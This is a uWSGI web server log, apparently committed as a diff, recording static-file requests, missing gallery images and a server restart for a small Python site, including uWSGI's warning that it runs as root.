+[pid: 18375|app: 0|req: 132/147] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 07:13:49 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 133/148] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:51 2019] GET /static/images/g3.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 134/149] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:52 2019] GET /static/images/g4.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 135/150] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:52 2019] GET /static/images/g5.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 136/151] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:52 2019] GET /static/images/g6.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 137/152] 80.82.77.33 () {38 vars in 452 bytes} [Sat Mar 23 07:13:53 2019] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 138/153] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:53 2019] GET /static/images/g7.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 139/154] 80.82.77.33 () {38 vars in 454 bytes} [Sat Mar 23 07:13:53 2019] GET /sitemap.xml => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 140/155] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:54 2019] GET /static/images/g2.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 141/156] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:54 2019] GET /static/images/g1.jpg => generated 98304 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 142/157] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:54 2019] GET /static/images/g9.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 143/158] 80.82.77.33 () {38 vars in 480 bytes} [Sat Mar 23 07:13:54 2019] GET /.well-known/security.txt => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 144/159] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:13:55 2019] GET /static/images/g8.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 145/160] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 07:13:55 2019] GET /static/images/g10.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 146/161] 80.82.77.33 () {44 vars in 547 bytes} [Sat Mar 23 07:13:55 2019] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 147/162] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 07:13:56 2019] GET /static/images/g12.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 148/163] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 07:14:05 2019] GET /static/images/g11.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 149/164] 114.216.151.15 () {50 vars in 830 bytes} [Sat Mar 23 07:22:49 2019] GET / => generated 19519 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 150/165] 14.215.176.145 () {48 vars in 718 bytes} [Sat Mar 23 07:26:50 2019] GET / => generated 19519 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 151/166] 14.215.176.145 () {48 vars in 713 bytes} [Sat Mar 23 07:26:50 2019] GET /static/css/bootstrap.css => generated 141622 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 305 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 152/167] 14.215.176.136 () {48 vars in 735 bytes} [Sat Mar 23 07:26:50 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 153/168] 14.215.176.140 () {48 vars in 719 bytes} [Sat Mar 23 07:26:50 2019] GET /static/css/font-awesome.css => generated 35134 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 303 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 154/169] 14.215.176.133 () {48 vars in 711 bytes} [Sat Mar 23 07:26:50 2019] GET /static/css/chocolat.css => generated 1951 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 155/170] 14.215.176.147 () {48 vars in 705 bytes} [Sat Mar 23 07:26:50 2019] GET /static/css/style.css => generated 56231 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 156/171] 14.215.176.133 () {48 vars in 714 bytes} [Sat Mar 23 07:26:50 2019] GET /static/js/modernizr-2.6.2.min.js => generated 15414 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 157/172] 14.215.176.136 () {48 vars in 707 bytes} [Sat Mar 23 07:26:51 2019] GET /static/css/italic.css => generated 12217 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 158/173] 14.215.176.133 () {48 vars in 707 bytes} [Sat Mar 23 07:26:51 2019] GET /static/css/family.css => generated 3082 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 159/174] 14.215.176.140 () {48 vars in 708 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 160/175] 14.215.176.134 () {48 vars in 704 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 161/176] 14.215.176.136 () {48 vars in 688 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/easing.js => generated 4758 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 162/177] 14.215.176.133 () {48 vars in 692 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/move-top.js => generated 1330 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 163/178] 14.215.176.134 () {48 vars in 706 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 164/179] 14.215.176.133 () {48 vars in 716 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 165/180] 14.215.176.136 () {48 vars in 684 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/main.js => generated 3260 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 166/181] 14.215.176.134 () {48 vars in 716 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/easy-responsive-tabs.js => generated 6489 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 167/182] 14.215.176.133 () {48 vars in 714 bytes} [Sat Mar 23 07:26:51 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 168/183] 14.215.176.145 () {48 vars in 742 bytes} [Sat Mar 23 07:26:53 2019] GET /static/fonts/glyphicons-halflings-regular.woff => generated 23424 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 169/184] 14.215.176.147 () {48 vars in 739 bytes} [Sat Mar 23 07:26:53 2019] GET /static/fonts/fontawesome-webfont.woff?v=4.6.3 => generated 90412 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 170/185] 114.216.151.15 () {48 vars in 800 bytes} [Sat Mar 23 07:28:45 2019] GET / => generated 19519 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 171/186] 114.216.151.15 () {48 vars in 800 bytes} [Sat Mar 23 07:39:04 2019] GET / => generated 19519 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 172/187] 114.216.151.15 () {52 vars in 859 bytes} [Sat Mar 23 07:39:05 2019] GET /static/css/bootstrap.css => generated 0 bytes in 2 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 173/188] 114.216.151.15 () {52 vars in 851 bytes} [Sat Mar 23 07:39:05 2019] GET /static/css/italic.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 174/189] 114.216.151.15 () {52 vars in 864 bytes} [Sat Mar 23 07:39:05 2019] GET /static/css/font-awesome.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
+[pid: 18374|app: 0|req: 16/190] 114.216.151.15 () {52 vars in 855 bytes} [Sat Mar 23 07:39:05 2019] GET /static/css/chocolat.css => generated 0 bytes in 8 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18374|app: 0|req: 17/191] 114.216.151.15 () {52 vars in 849 bytes} [Sat Mar 23 07:39:05 2019] GET /static/css/style.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18374|app: 0|req: 18/192] 114.216.151.15 () {52 vars in 850 bytes} [Sat Mar 23 07:39:05 2019] GET /static/css/family.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 175/193] 114.216.151.15 () {52 vars in 859 bytes} [Sat Mar 23 07:39:06 2019] GET /static/js/modernizr-2.6.2.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
+[pid: 18374|app: 0|req: 19/194] 114.216.151.15 () {52 vars in 882 bytes} [Sat Mar 23 07:39:06 2019] GET /static/images/banner1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 176/195] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:06 2019] GET /static/images/c3.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 177/196] 114.216.151.15 () {52 vars in 853 bytes} [Sat Mar 23 07:39:06 2019] GET /static/js/jquery-2.1.4.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 20/197] 114.216.151.15 () {52 vars in 878 bytes} [Sat Mar 23 07:39:06 2019] GET /static/css/easy-responsive-tabs.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 21/198] 114.216.151.15 () {52 vars in 848 bytes} [Sat Mar 23 07:39:06 2019] GET /static/js/jquery.picEyes.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18374|app: 0|req: 22/199] 114.216.151.15 () {52 vars in 851 bytes} [Sat Mar 23 07:39:07 2019] GET /static/js/jquery.chocolat.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 178/200] 114.216.151.15 () {52 vars in 831 bytes} [Sat Mar 23 07:39:07 2019] GET /static/js/easing.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 179/201] 114.216.151.15 () {52 vars in 828 bytes} [Sat Mar 23 07:39:07 2019] GET /static/js/main.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 180/202] 114.216.151.15 () {52 vars in 859 bytes} [Sat Mar 23 07:39:07 2019] GET /static/js/responsiveslides.min.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 181/203] 114.216.151.15 () {52 vars in 859 bytes} [Sat Mar 23 07:39:07 2019] GET /static/js/easy-responsive-tabs.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 182/204] 114.216.151.15 () {52 vars in 859 bytes} [Sat Mar 23 07:39:07 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 183/205] 114.216.151.15 () {52 vars in 835 bytes} [Sat Mar 23 07:39:07 2019] GET /static/js/move-top.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 184/206] 114.216.151.15 () {54 vars in 948 bytes} [Sat Mar 23 07:39:07 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 185/207] 114.216.151.15 () {54 vars in 948 bytes} [Sat Mar 23 07:39:07 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 186/208] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:07 2019] GET /static/images/t1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 187/209] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:08 2019] GET /static/images/c1.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 188/210] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:08 2019] GET /static/images/t4.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 189/211] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:08 2019] GET /static/images/c2.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 190/212] 114.216.151.15 () {52 vars in 890 bytes} [Sat Mar 23 07:39:08 2019] GET /static/images/arr.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 202 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 191/213] 114.216.151.15 () {52 vars in 898 bytes} [Sat Mar 23 07:39:08 2019] GET /static/images/arrows.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 192/214] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:08 2019] GET /static/images/g2.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 193/215] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:08 2019] GET /static/images/g3.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 194/216] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:09 2019] GET /static/images/t2.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 195/217] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:39:09 2019] GET /static/images/g1.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 196/218] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g5.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 197/219] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g6.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 198/220] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/t3.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 199/221] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g4.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 200/222] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g8.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 201/223] 114.216.151.15 () {52 vars in 870 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g9.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 202/224] 114.216.151.15 () {52 vars in 872 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g11.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 203/225] 114.216.151.15 () {52 vars in 872 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g10.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 204/226] 114.216.151.15 () {52 vars in 895 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/close.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 205/227] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:39:10 2019] GET /static/images/g7.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 206/228] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 07:39:11 2019] GET /static/images/g12.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 207/229] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 07:39:11 2019] GET /static/images/contact.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 208/230] 114.216.151.15 () {48 vars in 767 bytes} [Sat Mar 23 07:39:12 2019] GET /static/images/iron.ico => generated 38078 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 2)
+[uWSGI] getting INI configuration from /var/www/xinminhao/uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 23 07:40:51 2019] ***
+compiled with version: 6.3.0 20170516 on 21 March 2019 13:18:56
+os: Linux-4.9.0-8-amd64 #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08)
+nodename: xinminhao
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /root/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/xinminhao/
+your processes number limit is 3898
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 2.7.13 (default, Sep 26 2018, 18:42:22)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x555a77837780
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 312672 bytes (305 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x555a77837780 pid: 533 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 533)
+spawned uWSGI worker 1 (pid: 552, cores: 4)
+spawned uWSGI worker 2 (pid: 553, cores: 4)
+*** Stats server enabled on 127.0.0.1:9191 fd: 11 ***
+[pid: 552|app: 0|req: 1/1] 114.216.151.15 () {48 vars in 800 bytes} [Sat Mar 23 07:41:52 2019] GET / => generated 19519 bytes in 42 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 552|app: 0|req: 2/2] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:54 2019] GET /static/images/g1.jpg => generated 232 bytes in 9 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 3/3] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:54 2019] GET /static/images/g2.jpg => generated 232 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 553|app: 0|req: 1/4] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:55 2019] GET /static/images/g4.jpg => generated 232 bytes in 10 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 552|app: 0|req: 4/5] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:56 2019] GET /static/images/g5.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 553|app: 0|req: 2/6] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:56 2019] GET /static/images/g6.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 5/7] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:56 2019] GET /static/images/g8.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 553|app: 0|req: 3/8] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:57 2019] GET /static/images/g9.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 6/9] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 07:41:57 2019] GET /static/images/g10.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 552|app: 0|req: 7/10] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:41:57 2019] GET /static/images/g7.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 8/11] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 07:41:57 2019] GET /static/images/g11.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 9/12] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 07:41:57 2019] GET /static/images/g12.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 10/13] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:42:31 2019] GET /static/images/g3.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 553|app: 0|req: 4/14] 114.216.151.15 () {50 vars in 831 bytes} [Sat Mar 23 07:43:52 2019] GET / => generated 19519 bytes in 33 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 11/15] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:54 2019] GET /static/images/g2.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 553|app: 0|req: 5/16] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:54 2019] GET /static/images/g1.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 552|app: 0|req: 12/17] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:55 2019] GET /static/images/g3.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 552|app: 0|req: 13/18] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:55 2019] GET /static/images/g4.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 552|app: 0|req: 14/19] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:55 2019] GET /static/images/g5.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 552|app: 0|req: 15/20] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:56 2019] GET /static/images/g7.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 16/21] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:56 2019] GET /static/images/g9.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 553|app: 0|req: 6/22] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:56 2019] GET /static/images/g6.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 552|app: 0|req: 17/23] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 07:43:56 2019] GET /static/images/g10.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 18/24] 114.216.151.15 () {48 vars in 763 bytes} [Sat Mar 23 07:43:56 2019] GET /static/images/g8.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 19/25] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 07:43:57 2019] GET /static/images/g11.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
